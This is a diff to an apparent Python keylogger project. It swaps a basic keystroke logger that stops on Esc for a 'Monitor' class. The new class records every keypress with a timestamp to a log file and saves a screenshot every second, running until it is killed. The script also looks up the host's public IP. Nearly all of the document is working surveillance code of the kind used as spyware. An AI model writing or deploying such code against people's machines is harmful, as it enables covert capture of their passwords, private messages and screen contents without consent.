@@ -4,8 +4,11 @@ import os
 import random
 import requests
 import socket
+from threading import Timer, Thread
 
 from pynput.keyboard import Key, Listener
+from mss import mss
+
 
 publicIP = requests.get('https://api.ipify.org').text
 privateIP = socket.gethostbyname('localhost')
@@ -18,34 +21,37 @@ print(user)
 print(datetime)
 
 
-count = 0
-keys = []
+class IntervalTimer(Timer):
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
 
-def on_press(key):
-    global keys, count
+class Monitor:
 
-    keys.append(key)
-    count += 1
-    print("{0} pressed".format(key))
+    def on_press(self, k):
+        with open('./logs/keylogs/log.txt', 'a') as f:
+            f.write('{}\t\t{}\n'.format(k, time.time()))
 
-    if count>= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+    def _build_logs(self):
+        if not os.path.exists('./logs'):
+            os.mkdir('./logs')
+            os.mkdir('./logs/screenshots')
+            os.mkdir('./logs/keylogs')
 
-def write_file(keys):
-    with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
+    def _screenshot(self):
+        sct = mss()
+        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))
 
+    def _keylogger(self):
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    def run(self, interval=1):
+        self._build_logs()
+        Thread(target=self._keylogger).start()
+        IntervalTimer(interval, self._screenshot).start()
+
+if __name__ == '__main__':
+    mon = Monitor()
+    mon.run()
